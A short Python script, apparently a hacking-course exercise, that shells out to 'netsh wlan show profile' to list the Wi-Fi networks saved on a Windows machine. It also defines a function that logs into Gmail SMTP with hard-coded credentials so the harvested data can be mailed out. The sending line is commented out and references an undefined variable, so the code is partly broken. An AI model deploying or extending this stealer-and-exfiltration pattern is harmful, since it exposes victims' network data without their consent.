#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
print(network_names)
#send_mail("my_email@gmail.com", "abc123", result)